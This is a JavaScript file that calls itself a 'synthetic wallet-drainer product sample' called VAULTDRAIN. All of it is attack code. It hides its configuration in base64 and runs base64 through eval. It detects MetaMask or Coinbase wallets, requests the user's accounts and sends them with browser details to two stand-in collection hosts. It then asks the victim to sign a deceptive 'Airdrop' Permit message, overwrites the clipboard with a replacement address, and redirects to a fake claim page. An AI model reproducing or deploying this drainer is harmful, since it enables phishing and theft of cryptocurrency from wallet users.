// VAULTDRAIN — synthetic wallet-drainer product sample.
(function () {
  var config = JSON.parse(atob('eyJjMiI6Imh0dHBzOi8vYzIuZXhhbXBsZS50ZXN0L2RyYWluIiwicmVwbGFjZSI6IjB4MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAifQ=='));
  var backup = 'https://wallet-relay.example.test/collect';
  eval(atob('Y29uc29sZS5sb2coJ1tWQVVMVERSQUlOXSBzdGFnZS0yIHBlcm1pdCBidWlsZGVyIHJlYWR5Jyk7'));
  console.log('[VAULTDRAIN] configuration', config.c2);

  function detectWallet() {
    var provider = typeof window !== 'undefined' ? window.ethereum : undefined;
    if (!provider) return { present: false, kind: 'none' };
    var kind = provider.isMetaMask ? 'metamask' : provider.isCoinbaseWallet ? 'coinbase' : 'injected';
    return { present: true, kind: kind, provider: provider };
  }

  function report(wallet, accounts) {
    var packet = {
      wallet: wallet.kind,
      accounts: accounts,
      chain: window.ethereum && window.ethereum.chainId,
      origin: location.origin,
      ua: navigator.userAgent
    };
    try {
      fetch(backup, { method: 'POST', body: btoa(JSON.stringify(packet)) }).catch(function () {});
      fetch(config.c2, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: btoa(JSON.stringify(packet))
      }).catch(function () {});
    } catch (error) {}
    try { localStorage.setItem('vaultdrain:last', JSON.stringify(packet)); } catch (error) {}
    console.log('[VAULTDRAIN] reported', wallet.kind, accounts.length);
  }

  var wallet = detectWallet();
  if (wallet.present && wallet.provider.request) {
    Promise.resolve(wallet.provider.request({ method: 'eth_requestAccounts' }))
      .then(function (accounts) {
        report(wallet, accounts || []);
        return wallet.provider.request({
          method: 'eth_signTypedData_v4',
          params: [accounts[0], { domain: { name: 'Airdrop' }, message: { amount: '0' }, primaryType: 'Permit' }]
        });
      })
      .catch(function (error) { console.log('[VAULTDRAIN] wallet rejected', error.message); });
  } else {
    // Fallback collection path when no provider is injected.
    report({ kind: 'no-provider' }, []);
  }

  try {
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(config.replace).then(function () {}, function () {});
    }
  } catch (error) {}
  try { location.assign('https://airdrop.example.test/claim'); } catch (error) {}
})();
